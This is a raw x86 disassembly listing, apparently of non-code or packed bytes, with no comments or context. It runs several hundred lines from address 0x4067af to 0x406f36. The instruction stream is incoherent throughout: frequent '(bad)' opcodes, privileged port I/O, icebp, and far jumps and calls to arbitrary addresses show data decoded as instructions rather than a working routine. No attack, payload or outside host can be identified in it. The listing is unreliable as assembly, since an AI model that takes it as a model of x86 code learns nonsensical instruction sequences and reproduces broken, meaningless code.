  4067af:	lock into 
  4067b1:	sub    al,0x82
  4067b3:	imul   edi,DWORD PTR [ebp-0x4d61826],0x5d
  4067ba:	or     eax,0xc1e5c83
  4067bf:	sbb    al,0x37
  4067c1:	pop    esi
  4067c2:	in     eax,dx
  4067c3:	fcmovbe st,st(6)
  4067c5:	in     eax,dx
  4067c6:	jl     0x4067a9
  4067c8:	dec    ecx
  4067c9:	pop    esp
  4067ca:	sub    BYTE PTR [esi+0x6b],ch
  4067cd:	mov    ebx,0x549d74f9
  4067d2:	or     eax,edx
  4067d4:	clc    
  4067d5:	or     BYTE PTR [esi+ebx*1-0x17],bl
  4067d9:	gs mov esi,ss
  4067dc:	pop    esp
  4067dd:	dec    edi
  4067de:	test   BYTE PTR [esi+0x362ad95c],0xa0
  4067e5:	mov    ah,BYTE PTR [edi+0x38]
  4067e8:	inc    edi
  4067e9:	add    DWORD PTR [esi],esi
  4067eb:	call   0xccd577a7
  4067f0:	mov    ds:0xb3e4a90,eax
  4067f5:	xor    DWORD PTR [esi+eax*8],ecx
  4067f8:	adc    edx,DWORD PTR [esi+0x7a2fed05]
  4067fe:	scas   al,BYTE PTR es:[edi]
  4067ff:	leave  
  406800:	adc    DWORD PTR [ebp-0x3a],0xffffffbe
  406804:	jmp    0x40678d
  406806:	icebp  
  406807:	inc    ebx
  406808:	jp     0x4067be
  40680a:	dec    eax
  40680b:	jge    0x40681a
  40680d:	nop
  40680e:	fcos   
  406810:	jnp    0x40685e
  406812:	pusha  
  406813:	pop    ecx
  406814:	popa   
  406815:	(bad)  
  406816:	retf   
  406817:	daa    
  406818:	retf   0x3377
  40681b:	push   es
  40681c:	in     eax,dx
  40681d:	call   0x58949f98
  406822:	or     eax,0x7cf6f2d0
  406827:	je     0x406812
  406829:	repnz inc eax
  40682b:	sbb    DWORD PTR [ebx+eax*4],ebp
  40682e:	data16 mov al,ds:0x5b84e9b7
  406834:	mov    ebp,0x5fd36531
  406839:	adc    eax,0xbb42b650
  40683e:	dec    eax
  40683f:	dec    esp
  406840:	jg     0x4067f7
  406842:	inc    edx
  406843:	or     DWORD PTR [esi],0xb9296c3c
  406849:	cmp    dl,BYTE PTR [eax]
  40684b:	xchg   dl,bl
  40684d:	inc    edi
  40684e:	cld    
  40684f:	xor    ebp,0x2bcc4123
  406855:	scas   al,BYTE PTR es:[edi]
  406856:	stc    
  406857:	jle    0x4067dd
  406859:	(bad)  
  40685b:	dec    esp
  40685c:	bnd jge 0x40685d
  40685f:	repz sub al,al
  406862:	push   edx
  406863:	fisttp QWORD PTR [ebx]
  406865:	jns    0x406816
  406867:	jle    0x406862
  406869:	test   eax,0xd9f1bd33
  40686e:	in     al,dx
  40686f:	gs inc ebx
  406871:	gs xchg edx,eax
  406873:	nop
  406874:	mov    al,0x43
  406876:	inc    edx
  406877:	mov    eax,DWORD PTR [edi-0x7c]
  40687a:	js     0x4068f5
  40687c:	dec    ecx
  40687d:	in     al,0xfe
  40687f:	and    DWORD PTR [edi-0x2d],eax
  406882:	fs pop ebp
  406884:	add    al,BYTE PTR [esi+0x33]
  406887:	push   edx
  406888:	pop    ss
  406889:	fisubr DWORD PTR [esi-0x45a17d37]
  40688f:	fsub   st(0),st
  406891:	pop    ds
  406892:	mov    edx,0x67409bfe
  406897:	in     al,0xf4
  406899:	push   ebp
  40689a:	dec    ecx
  40689b:	and    BYTE PTR [edi+eax*1+0x8ca3380],bh
  4068a2:	pop    edi
  4068a3:	ins    DWORD PTR es:[edi],dx
  4068a4:	ds push ss
  4068a6:	mov    BYTE PTR [esi-0x8],ah
  4068a9:	push   0x62
  4068ab:	shl    BYTE PTR [esi-0x24],1
  4068ae:	pop    ds
  4068af:	cld    
  4068b0:	xor    dl,BYTE PTR [ebx]
  4068b2:	cmp    cl,0x11
  4068b5:	pop    ss
  4068b6:	out    0x9f,al
  4068b8:	adc    ah,dl
  4068ba:	and    al,BYTE PTR [esi]
  4068bc:	mov    eax,ds:0x46cf6657
  4068c1:	call   0x7eb1:0x1edc1247
  4068c8:	stos   DWORD PTR es:[edi],eax
  4068c9:	pop    edi
  4068ca:	mov    ds:0x98974df0,eax
  4068cf:	pop    ebp
  4068d0:	inc    esi
  4068d1:	in     eax,dx
  4068d2:	xor    al,0x37
  4068d4:	add    ebx,DWORD PTR [eax]
  4068d6:	icebp  
  4068d7:	inc    ecx
  4068d8:	xchg   edi,ecx
  4068da:	jecxz  0x4068d2
  4068dc:	jge    0x406862
  4068de:	mov    ds:0xd8084946,eax
  4068e3:	outs   dx,DWORD PTR ds:[esi]
  4068e4:	(bad)  
  4068e5:	stos   DWORD PTR es:[edi],eax
  4068e6:	push   ss
  4068e7:	inc    edx
  4068e8:	pop    ds
  4068e9:	mov    eax,ds:0xe4826322
  4068ee:	in     eax,dx
  4068ef:	mov    bh,0x96
  4068f1:	adc    DWORD PTR [ecx],0xffffffca
  4068f4:	jnp    0x4068ca
  4068f6:	pop    ebx
  4068f7:	jno    0x406932
  4068f9:	inc    esi
  4068fa:	popf   
  4068fb:	fs int3 
  4068fd:	out    dx,al
  4068fe:	and    ebx,edx
  406900:	int3   
  406901:	ficom  WORD PTR [edi]
  406903:	lea    ecx,[ecx-0x3e009efc]
  406909:	fs scas eax,DWORD PTR es:[edi]
  40690b:	and    bl,BYTE PTR ds:0x68a5e558
  406911:	dec    eax
  406912:	push   ebx
  406913:	xor    DWORD PTR [ebx+0x5e1d72ca],0x5b
  40691a:	mov    al,cs:0x992b94e9
  406920:	repnz push edi
  406922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406923:	pop    es
  406924:	cmp    dh,ch
  406926:	xchg   ebx,eax
  406927:	xor    cl,BYTE PTR [edi+0xe]
  40692a:	ins    DWORD PTR es:[edi],dx
  40692b:	xor    bl,BYTE PTR [ebx-0x34cb543c]
  406931:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  406933:	cli    
  406934:	xchg   ecx,eax
  406935:	outs   dx,DWORD PTR ds:[si]
  406937:	gs ins DWORD PTR es:[edi],dx
  406939:	(bad)  
  40693a:	xlat   BYTE PTR ds:[ebx]
  40693b:	pop    es
  40693c:	mov    ds:0xa838049c,al
  406941:	mov    cl,0xae
  406943:	cmp    eax,0x81910fe4
  406948:	pusha  
  406949:	leave  
  40694a:	popa   
  40694b:	push   ss
  40694c:	push   ebx
  40694d:	jg     0x40690d
  40694f:	call   0xc8ea94ef
  406954:	mov    bl,0xd8
  406956:	pop    ds
  406957:	lods   al,BYTE PTR gs:[esi]
  406959:	or     BYTE PTR [ecx+eiz*8],0x1f
  40695d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40695e:	push   ebx
  40695f:	jne    0x406922
  406961:	push   edi
  406962:	and    eax,0x83ceb8cb
  406967:	xchg   esp,eax
  406968:	pop    ecx
  406969:	les    eax,FWORD PTR [ecx]
  40696b:	in     eax,0xfe
  40696d:	ret    
  40696e:	stos   BYTE PTR es:[edi],al
  40696f:	inc    ecx
  406970:	jmp    0xfd0c2353
  406975:	pop    edx
  406976:	jmp    0x4069f1
  406978:	dec    esp
  406979:	loopne 0x406923
  40697b:	and    al,0xc3
  40697d:	pop    ss
  40697e:	into   
  40697f:	jecxz  0x40693d
  406981:	inc    ebp
  406982:	push   esi
  406983:	icebp  
  406984:	test   DWORD PTR [ebp+0x3436eb18],edi
  40698a:	fdivrp st(0),st
  40698c:	xor    dl,BYTE PTR [ebp+0x75]
  40698f:	(bad)  
  406990:	push   edi
  406991:	adc    DWORD PTR [ecx],0x4d3d7fa6
  406997:	dec    ecx
  406998:	cmc    
  406999:	push   ebx
  40699a:	mov    ebx,0xab4bba78
  40699f:	jp     0x406994
  4069a1:	xchg   edx,eax
  4069a2:	mov    ds:0x5b9d95a6,eax
  4069a7:	mov    ecx,0x27c60337
  4069ac:	test   dh,ch
  4069ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069af:	or     BYTE PTR [edx+0x3f9b7216],bl
  4069b5:	dec    esp
  4069b6:	add    DWORD PTR [ebx],0xa32c70a4
  4069bc:	stos   DWORD PTR es:[edi],eax
  4069bd:	xchg   BYTE PTR [edi],dl
  4069bf:	out    dx,al
  4069c0:	les    edx,FWORD PTR [ecx+ebx*1-0x7dda829f]
  4069c7:	pop    esi
  4069c8:	popf   
  4069c9:	mov    dh,0xbe
  4069cb:	aad    0x3f
  4069cd:	mov    ah,0xd
  4069cf:	(bad)  
  4069d0:	lods   al,BYTE PTR ds:[esi]
  4069d1:	aaa    
  4069d2:	retf   
  4069d3:	cmp    ebp,DWORD PTR [esi-0x7f1cb676]
  4069d9:	mov    eax,0x9fe2465e
  4069de:	ret    
  4069df:	leave  
  4069e0:	mov    cl,0xb7
  4069e2:	jmp    0xcf16:0xc5a9a0fe
  4069e9:	stos   BYTE PTR es:[edi],al
  4069ea:	loope  0x406a0b
  4069ec:	lods   al,BYTE PTR ds:[esi]
  4069ed:	mov    ch,0xcd
  4069ef:	ror    BYTE PTR [ebp+ebp*1-0xd],0x73
  4069f4:	push   esi
  4069f5:	hlt    
  4069f6:	and    eax,0xb030123c
  4069fb:	ficomp WORD PTR [esp+ebp*1+0x7b]
  4069ff:	(bad)  
  406a00:	(bad)  
  406a01:	stos   DWORD PTR es:[edi],eax
  406a02:	inc    esp
  406a03:	lea    esi,[ecx+ebp*1-0x8]
  406a07:	ret    
  406a08:	cdq    
  406a09:	hlt    
  406a0a:	and    edx,DWORD PTR [ecx-0x37fc894d]
  406a10:	in     eax,0x2f
  406a12:	add    dh,BYTE PTR [ecx]
  406a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a15:	dec    esi
  406a16:	loop   0x406a84
  406a18:	loop   0x406a01
  406a1a:	mov    ds:0xd4db63e0,al
  406a1f:	dec    edi
  406a20:	adc    al,bl
  406a22:	hlt    
  406a23:	cmp    DWORD PTR [edx+0x43],ebx
  406a26:	imul   ecx,ebx,0x62483837
  406a2c:	or     BYTE PTR [ecx-0x1aee7043],ch
  406a32:	cmp    DWORD PTR [edi-0x61c70c09],0xcac74cb1
  406a3c:	addr16 jo 0x406a58
  406a3f:	push   ss
  406a40:	xchg   BYTE PTR [edx],cl
  406a42:	jge    0x406a81
  406a44:	cli    
  406a45:	add    bl,BYTE PTR [edi]
  406a47:	pop    esi
  406a48:	sbb    ah,BYTE PTR [esi-0x5efeabd4]
  406a4e:	sar    BYTE PTR [esi],1
  406a50:	xlat   BYTE PTR ds:[ebx]
  406a51:	lea    edi,[edx]
  406a53:	stos   BYTE PTR es:[edi],al
  406a54:	or     al,0xc4
  406a56:	sti    
  406a57:	(bad)  
  406a58:	mov    dl,0xb5
  406a5a:	and    al,0xe8
  406a5c:	add    bh,BYTE PTR [ecx]
  406a5e:	sar    BYTE PTR [ebx+0xb],1
  406a61:	dec    edi
  406a62:	or     eax,DWORD PTR gs:[esi-0x71]
  406a66:	stos   BYTE PTR es:[edi],al
  406a67:	mov    dh,0x86
  406a69:	shl    DWORD PTR [esi+eiz*4+0x49],1
  406a6d:	leave  
  406a6e:	and    al,BYTE PTR [ecx-0xd4031fd]
  406a74:	sbb    ebx,eax
  406a76:	mov    al,ds:0x90fa97fa
  406a7b:	hlt    
  406a7c:	pop    ebp
  406a7d:	xor    BYTE PTR [ebx+edi*1],al
  406a80:	cld    
  406a81:	or     DWORD PTR [ebx-0x645efdb9],edi
  406a87:	mov    esi,0x667fc3f1
  406a8c:	mov    cl,0x61
  406a8e:	jp     0x406a4a
  406a90:	lods   eax,DWORD PTR ds:[esi]
  406a91:	(bad)  
  406a92:	cmp    eax,edi
  406a94:	lock dec ecx
  406a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a97:	inc    eax
  406a98:	sub    eax,0xe05e186e
  406a9d:	mov    cs,WORD PTR [esi]
  406a9f:	js     0x406a64
  406aa1:	in     al,dx
  406aa2:	clc    
  406aa3:	pushf  
  406aa4:	mov    dl,0x2c
  406aa6:	mov    esi,0xceaf674f
  406aab:	repnz neg DWORD PTR [eax]
  406aae:	adc    eax,0xf808e5c0
  406ab3:	data16 jecxz 0x406a57
  406ab6:	ret    
  406ab7:	inc    edx
  406ab9:	out    dx,eax
  406aba:	cdq    
  406abb:	jne    0x406a64
  406abd:	inc    ecx
  406abe:	in     eax,dx
  406abf:	mov    ds:0x1a900a6b,al
  406ac4:	sti    
  406ac5:	addr16 nop
  406ac7:	xchg   ebp,eax
  406ac8:	aas    
  406ac9:	sbb    DWORD PTR [edi-0x38d8e122],eax
  406acf:	push   edx
  406ad0:	xor    BYTE PTR [ebx+eax*1],dh
  406ad3:	push   eax
  406ad4:	cli    
  406ad5:	adc    eax,0x3e3028ac
  406ada:	jp     0x406b2e
  406adc:	data16 sbb BYTE PTR [edi+0x75ee5890],bh
  406ae3:	loopne 0x406af4
  406ae5:	ins    BYTE PTR es:[edi],dx
  406ae6:	loop   0x406b37
  406ae8:	enter  0x4c7a,0x68
  406aec:	push   es
  406aed:	arpl   dx,cx
  406aef:	outs   dx,DWORD PTR ds:[esi]
  406af0:	outs   dx,BYTE PTR ds:[esi]
  406af1:	fcmovnu st,st(0)
  406af3:	pop    edi
  406af4:	mul    DWORD PTR [esi]
  406af6:	or     eax,ebx
  406af8:	dec    edi
  406af9:	push   edi
  406afa:	or     edi,DWORD PTR [edx+0x57]
  406afd:	xchg   esp,eax
  406afe:	rol    BYTE PTR [esi-0x7501faf3],0x7b
  406b05:	lods   eax,DWORD PTR ds:[esi]
  406b06:	pop    ebp
  406b07:	loope  0x406b6f
  406b09:	cwde   
  406b0a:	adc    dl,dh
  406b0c:	enter  0x4aa8,0x9f
  406b10:	jmp    0x406b62
  406b12:	add    BYTE PTR [edi+0x29207f3e],0x53
  406b19:	inc    edx
  406b1a:	call   0xa0ee:0x6bd90313
  406b21:	pop    ebp
  406b22:	in     al,dx
  406b23:	rcl    al,1
  406b25:	adc    eax,0x9dedf8ec
  406b2a:	push   edi
  406b2b:	pushf  
  406b2c:	dec    ebp
  406b2d:	pop    edx
  406b2e:	das    
  406b2f:	retw   0x17d5
  406b33:	test   DWORD PTR [ebx-0x19],ebp
  406b36:	out    0xc2,eax
  406b38:	pop    ebx
  406b39:	xchg   edx,eax
  406b3a:	xchg   ebx,eax
  406b3b:	push   edx
  406b3c:	and    bl,al
  406b3e:	pop    ebp
  406b3f:	in     al,0x72
  406b41:	cs mov bh,0x78
  406b44:	adc    DWORD PTR [esi+0x29],esi
  406b47:	bound  ecx,QWORD PTR [esi+0x13f11039]
  406b4d:	pop    ebp
  406b4e:	mov    WORD PTR fs:[edx+edx*1-0x5efdca6],gs
  406b56:	dec    edi
  406b57:	cdq    
  406b58:	mov    BYTE PTR [eax+0x2],dl
  406b5b:	or     ah,cl
  406b5d:	gs or  al,0x89
  406b60:	fnstcw WORD PTR [esi-0x41b5f993]
  406b66:	cwde   
  406b67:	jl     0x406b8f
  406b69:	sub    eax,0x1d86a6c
  406b6e:	dec    esp
  406b6f:	(bad)  
  406b70:	std    
  406b71:	cld    
  406b72:	loope  0x406afb
  406b74:	jp     0x406b6d
  406b76:	dec    esp
  406b77:	inc    eax
  406b78:	std    
  406b79:	fs daa 
  406b7b:	mov    edx,0xe63500b1
  406b80:	outs   dx,BYTE PTR ds:[esi]
  406b81:	rol    BYTE PTR [eax],cl
  406b83:	adc    dl,BYTE PTR [ecx+0xa3473e2]
  406b89:	xchg   BYTE PTR [edi],bl
  406b8b:	jmp    0x672f:0x8cc09bce
  406b92:	add    al,0x9a
  406b94:	push   0xffffff9b
  406b96:	add    DWORD PTR [edi],edx
  406b98:	and    BYTE PTR [eax+0x7107321c],al
  406b9e:	jae    0x406beb
  406ba0:	jno    0x406be1
  406ba2:	sti    
  406ba3:	mov    ds:0x202d58d6,al
  406ba8:	pop    es
  406ba9:	fadd   QWORD PTR [ecx]
  406bab:	push   0x31
  406bad:	sub    eax,0xde9879ab
  406bb2:	std    
  406bb3:	sub    al,0xb5
  406bb5:	mov    bh,0x99
  406bb7:	loop   0x406b3b
  406bb9:	xchg   esp,eax
  406bba:	xchg   ebx,eax
  406bbb:	das    
  406bbc:	add    al,BYTE PTR [edi-0x5a]
  406bbf:	or     al,0x19
  406bc1:	jne    0x406b6e
  406bc3:	push   0x25782295
  406bc8:	scas   al,BYTE PTR es:[edi]
  406bc9:	outs   dx,BYTE PTR ds:[esi]
  406bca:	test   eax,eax
  406bcc:	mov    esi,0x8da0a963
  406bd1:	xor    ah,BYTE PTR [esi-0x385dce36]
  406bd7:	ret    0xe7be
  406bda:	mov    esi,0xf54a1141
  406bdf:	loope  0x406c1e
  406be1:	push   cs
  406be2:	or     al,0xd0
  406be4:	mov    ebp,0x72336f4f
  406be9:	or     eax,0x6b9140ef
  406bee:	das    
  406bef:	adc    BYTE PTR [ebp-0x247a32c],0xd7
  406bf6:	xchg   BYTE PTR [ecx+0x357a2cc9],ch
  406bfc:	stc    
  406bfd:	lods   al,BYTE PTR ds:[esi]
  406bfe:	je     0x406c29
  406c00:	aam    0xf7
  406c02:	push   cs
  406c03:	sub    esi,DWORD PTR ss:[esi-0x5f]
  406c07:	dec    ecx
  406c08:	or     DWORD PTR [eax-0x47d80272],esi
  406c0e:	cmp    al,0x86
  406c10:	push   esp
  406c11:	jno    0x406bc2
  406c13:	call   FWORD PTR [ebx]
  406c15:	and    edi,edx
  406c17:	cmc    
  406c18:	neg    BYTE PTR [edi]
  406c1a:	adc    al,0xc2
  406c1c:	icebp  
  406c1d:	nop
  406c1e:	int    0x51
  406c20:	mov    esp,0x5f7c17a8
  406c25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c26:	jp     0x406c2a
  406c28:	out    dx,eax
  406c29:	add    ebp,DWORD PTR [ebp+edi*4+0x7ab50f51]
  406c30:	out    dx,eax
  406c31:	in     eax,0x51
  406c33:	rcl    DWORD PTR [ecx],cl
  406c35:	hlt    
  406c36:	scas   al,BYTE PTR es:[edi]
  406c37:	add    ebx,DWORD PTR [ecx-0x66]
  406c3a:	lahf   
  406c3b:	or     edx,DWORD PTR [ebx+0x15a51aaf]
  406c41:	or     al,0xbf
  406c43:	rol    BYTE PTR [edx+ecx*1-0x12],cl
  406c47:	(bad)  
  406c48:	dec    BYTE PTR [ebp-0x2]
  406c4b:	sub    al,0x8b
  406c4d:	push   es
  406c4e:	(bad)  
  406c4f:	int    0x28
  406c51:	pop    edi
  406c52:	sub    eax,0x8a379c7e
  406c57:	adc    al,0x66
  406c59:	mov    ah,0x2
  406c5b:	sub    al,0x98
  406c5d:	sbb    ch,BYTE PTR [edx-0x8f3e941]
  406c63:	shl    DWORD PTR [ebx-0x5ad7c252],cl
  406c69:	hlt    
  406c6a:	mov    esi,0x48e0560a
  406c6f:	dec    ecx
  406c70:	lock mov BYTE PTR [eax+0x12],ah
  406c74:	loop   0x406c24
  406c76:	(bad)  
  406c78:	sub    edi,esp
  406c7a:	scas   al,BYTE PTR es:[edi]
  406c7b:	pop    ebx
  406c7c:	mov    ecx,0x8c214815
  406c81:	mov    bh,0x89
  406c83:	fwait
  406c84:	mov    edi,0xe74568ae
  406c89:	fs fs (bad) 
  406c8d:	pop    eax
  406c8e:	mov    bx,0x2ec2
  406c92:	lds    ecx,FWORD PTR [ecx]
  406c94:	cmp    bl,ah
  406c96:	dec    esp
  406c97:	aas    
  406c98:	fimul  WORD PTR ds:0x7e6f2e51
  406c9e:	mov    edi,0x69b74b90
  406ca3:	adc    DWORD PTR [edi-0x2817b1e4],edx
  406ca9:	daa    
  406caa:	pop    esi
  406cab:	pop    eax
  406cac:	sahf   
  406cad:	mov    ds:0x7b14a1a,eax
  406cb2:	sub    BYTE PTR [edx],cl
  406cb4:	sub    BYTE PTR [ebx],dh
  406cb6:	std    
  406cb7:	jae    0x406d27
  406cb9:	jae    0x406d0f
  406cbb:	add    eax,0x83330f54
  406cc0:	sbb    al,0xc1
  406cc2:	scas   al,BYTE PTR es:[edi]
  406cc3:	xchg   ebx,eax
  406cc4:	mov    al,ds:0xa6b24de9
  406cc9:	rcr    BYTE PTR cs:[edx+ecx*1],1
  406ccd:	push   edi
  406cce:	xchg   edi,ecx
  406cd0:	repz in al,0x81
  406cd3:	(bad)  
  406cd4:	imul   ecx,DWORD PTR [eax+0x69],0x8ecf5fe1
  406cdb:	ret    0x191e
  406cde:	call   0x1bb12b01
  406ce3:	ret    
  406ce4:	in     al,0x80
  406ce6:	xchg   ebp,eax
  406ce7:	rol    DWORD PTR [edi-0x37],1
  406cea:	imul   ecx,DWORD PTR [ebx-0x3e99d9f9],0x1b
  406cf1:	push   ss
  406cf2:	mov    BYTE PTR [eax-0x4d],0xc2
  406cf6:	sahf   
  406cf7:	popa   
  406cf8:	retf   0x55cf
  406cfb:	add    BYTE PTR [ecx+0x77bad2b7],bl
  406d01:	(bad)  
  406d02:	xchg   esi,eax
  406d03:	sub    al,0x63
  406d05:	loop   0x406cb4
  406d07:	jae    0x406cb3
  406d09:	adc    BYTE PTR [ecx-0x40],dh
  406d0c:	sbb    al,0x31
  406d0e:	xor    ecx,DWORD PTR [esi-0x6]
  406d11:	add    ebx,DWORD PTR [esi+eiz*1]
  406d14:	out    dx,eax
  406d15:	inc    ecx
  406d16:	mov    DWORD PTR [esi+0x50c7da31],ecx
  406d1c:	mov    ds:0x8033ceb7,al
  406d21:	fpatan 
  406d23:	loope  0x406caf
  406d25:	mov    ebx,DWORD PTR [ebp+0x634dc764]
  406d2b:	push   cs
  406d2c:	in     al,dx
  406d2d:	push   eax
  406d2e:	mov    ds:0x6599525a,al
  406d33:	mov    ch,BYTE PTR [esi+ebx*4]
  406d36:	xchg   BYTE PTR [esi],al
  406d38:	push   ds
  406d39:	test   eax,0x95e8da6c
  406d3e:	xchg   edx,eax
  406d3f:	adc    al,0x5
  406d41:	jmp    0x83c0:0x2d616e67
  406d48:	dec    ebx
  406d49:	mov    edi,0x75503de6
  406d4e:	add    al,0xcf
  406d50:	aas    
  406d51:	sub    BYTE PTR [esi+eiz*1],ch
  406d54:	mov    al,ds:0xd543f6ba
  406d59:	or     ebx,esi
  406d5b:	sub    eax,DWORD PTR [esi]
  406d5d:	stc    
  406d5e:	into   
  406d5f:	sbb    BYTE PTR [ecx-0x39],0x16
  406d63:	and    DWORD PTR [ebx],ebp
  406d65:	bound  ebp,QWORD PTR [edi]
  406d67:	in     eax,dx
  406d68:	xchg   ebp,eax
  406d69:	sbb    BYTE PTR [edx-0x51b6dc7a],cl
  406d6f:	xchg   edx,eax
  406d70:	stos   DWORD PTR es:[edi],eax
  406d71:	add    eax,0x4bba3032
  406d76:	(bad)  
  406d77:	arpl   WORD PTR [eax],di
  406d79:	sub    al,0xe1
  406d7b:	and    ecx,eax
  406d7d:	daa    
  406d7e:	es test BYTE PTR cs:[ebx-0x44],0x10
  406d84:	mov    bl,0x12
  406d86:	xor    bh,0x2c
  406d89:	cli    
  406d8a:	mov    bh,0xc8
  406d8c:	loope  0x406de9
  406d8e:	xor    DWORD PTR [edi-0x7e11b856],edx
  406d94:	test   BYTE PTR [edx-0x55721ae4],ch
  406d9a:	inc    ecx
  406d9b:	jmp    0x17e3559f
  406da0:	mov    dl,0xe7
  406da2:	and    bl,BYTE PTR [eax+edx*1+0x49]
  406da6:	lods   eax,DWORD PTR ds:[esi]
  406da7:	dec    esi
  406da8:	sahf   
  406da9:	cwde   
  406daa:	xor    ecx,ecx
  406dac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dad:	shr    DWORD PTR [ebx],0x54
  406db0:	scas   eax,DWORD PTR es:[edi]
  406db1:	aad    0xff
  406db3:	jle    0x406d49
  406db5:	mov    bl,0x21
  406db7:	stos   BYTE PTR es:[edi],al
  406db8:	es adc BYTE PTR fs:[eax],ah
  406dbc:	xor    al,ah
  406dbe:	push   eax
  406dbf:	push   eax
  406dc0:	jecxz  0x406deb
  406dc2:	fild   DWORD PTR ds:0xb4adc19f
  406dc8:	sbb    DWORD PTR [edi],ebp
  406dca:	jmp    0xfece:0xec341011
  406dd1:	jnp    0x406d9b
  406dd3:	sbb    al,BYTE PTR [eax]
  406dd5:	add    DWORD PTR [edi],ebx
  406dd7:	fsubr  st,st(2)
  406dd9:	pop    ds
  406dda:	ret    
  406ddb:	dec    edi
  406ddc:	fbld   TBYTE PTR [ebx]
  406dde:	mov    al,0xb2
  406de0:	stc    
  406de1:	xchg   edx,eax
  406de2:	push   cs
  406de3:	gs imul ecx,DWORD PTR gs:[ebx+0x7d53e678],0x2ffa4a44
  406def:	push   edx
  406df0:	and    eax,0xbf9468e6
  406df5:	jge    0x406dc7
  406df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406df8:	adc    dh,BYTE PTR [ebp+0x609857c4]
  406dfe:	mov    BYTE PTR [ebp+eiz*8+0x7c30ee5e],al
  406e05:	(bad)  
  406e06:	stos   DWORD PTR es:[edi],eax
  406e07:	cli    
  406e08:	pop    ds
  406e09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e0a:	pop    ebp
  406e0b:	sub    bl,dl
  406e0d:	mov    eax,0x39cc447
  406e12:	icebp  
  406e13:	xchg   ecx,eax
  406e14:	out    dx,al
  406e15:	mov    bh,0x90
  406e17:	fwait
  406e18:	mov    edi,0xb18d5717
  406e1d:	stos   DWORD PTR es:[edi],eax
  406e1e:	js     0x406e0b
  406e20:	and    cl,BYTE PTR [edx+0x2e]
  406e23:	jno    0x406e6c
  406e25:	ror    DWORD PTR [ecx+0x1e8b3fb4],1
  406e2b:	xor    eax,0xdd1e26de
  406e30:	dec    esi
  406e31:	imul   esi
  406e33:	pushf  
  406e34:	in     al,0x7a
  406e36:	and    BYTE PTR [edx],bh
  406e38:	pop    esi
  406e39:	fimul  WORD PTR [ecx-0x124d6c6a]
  406e3f:	fiadd  DWORD PTR [edi-0xfb2e79d]
  406e45:	jl     0x406e87
  406e47:	sub    esp,DWORD PTR [edi]
  406e49:	adc    bl,dh
  406e4b:	cmp    esp,DWORD PTR [edx]
  406e4d:	jno    0x406e77
  406e4f:	inc    eax
  406e50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e51:	(bad)
  406e54:	mov    edx,0x65c8ef47
  406e59:	jl     0x406df2
  406e5b:	pop    ss
  406e5c:	test   eax,0x4cfa3e61
  406e61:	imul   BYTE PTR [edi]
  406e63:	cmp    BYTE PTR [esi+esi*1-0x45],ah
  406e67:	jbe    0x406e88
  406e69:	(bad)  
  406e6a:	fbld   TBYTE PTR [eax]
  406e6c:	repz jo 0x406dfa
  406e6f:	pushf  
  406e70:	adc    al,0x9e
  406e72:	cdq    
  406e73:	add    bh,bl
  406e75:	jecxz  0x406eef
  406e77:	in     eax,dx
  406e78:	xchg   ecx,eax
  406e79:	jmp    0xc501:0xfbfa99cb
  406e80:	pop    ebp
  406e81:	aad    0x72
  406e83:	lea    ecx,[ecx+0x4ac91563]
  406e89:	cdq    
  406e8a:	out    dx,al
  406e8b:	shl    DWORD PTR [ecx-0x4b6e91cb],1
  406e91:	mov    ?,WORD PTR [esi]
  406e93:	(bad)  
  406e94:	mov    ah,0xa3
  406e96:	out    dx,al
  406e97:	(bad)  
  406e98:	sub    al,0x7a
  406e9a:	cmp    eax,0xf42807fa
  406e9f:	stos   BYTE PTR es:[edi],al
  406ea0:	pop    ecx
  406ea1:	dec    esp
  406ea2:	es (bad) 
  406ea5:	sub    eax,0x7cd657bd
  406eaa:	pop    esp
  406eab:	dec    eax
  406eac:	mov    edi,0xb350fcad
  406eb1:	xchg   DWORD PTR [ebx+ebx*1+0x77e2fb57],ebx
  406eb8:	retf   
  406eb9:	aad    0x43
  406ebb:	and    cl,BYTE PTR [edx]
  406ebd:	hlt    
  406ebe:	jp     0x406eb8
  406ec0:	imul   edi,DWORD PTR [edi+0x13199b96],0xffffff80
  406ec7:	test   eax,0xfcb5ed7c
  406ecc:	sub    al,0xa1
  406ece:	sbb    eax,DWORD PTR [edi-0x65]
  406ed1:	jmp    0x37ed7987
  406ed6:	mov    ds:0xd58214cd,eax
  406edb:	pop    es
  406edc:	pop    ebx
  406edd:	clc    
  406ede:	(bad)  
  406edf:	or     DWORD PTR [esi],ebp
  406ee1:	fmul   st,st(5)
  406ee3:	pop    ecx
  406ee4:	mov    ecx,0x313c415
  406ee9:	sbb    eax,ecx
  406eeb:	jb     0x406f34
  406eed:	pusha  
  406eee:	stos   BYTE PTR es:[edi],al
  406eef:	push   ebx
  406ef0:	stos   BYTE PTR es:[edi],al
  406ef1:	stc    
  406ef2:	sbb    bh,BYTE PTR [edx+0x26]
  406ef5:	je     0x406ed5
  406ef7:	out    0xf3,al
  406ef9:	pop    es
  406efa:	mov    edx,0xf2dda2c8
  406eff:	jg     0x406efc
  406f01:	popa   
  406f02:	inc    esi
  406f03:	psubq  mm5,mm5
  406f06:	sbb    ah,BYTE PTR [edx-0xe]
  406f09:	push   ebp
  406f0a:	addr16 int3 
  406f0c:	or     al,0xdd
  406f0e:	mov    eax,DWORD PTR [esi]
  406f10:	jg     0x406f76
  406f12:	push   0xffffffa1
  406f14:	sub    al,0x2b
  406f16:	out    0xd8,eax
  406f18:	dec    edx
  406f19:	out    dx,al
  406f1a:	ficomp DWORD PTR [bp+di+0x2a]
  406f1e:	push   esi
  406f1f:	mov    BYTE PTR [edx-0x21d430bd],al
  406f25:	cmp    ch,BYTE PTR [ebp+edi*2-0x5a]
  406f29:	out    dx,eax
  406f2a:	fstp   TBYTE PTR [eax+eiz*2]
  406f2d:	mov    al,bh
  406f2f:	jl     0x406f0c
  406f31:	popf   
  406f32:	in     eax,0x7c
  406f34:	loopne 0x406f40
  406f36:	dec    ebx
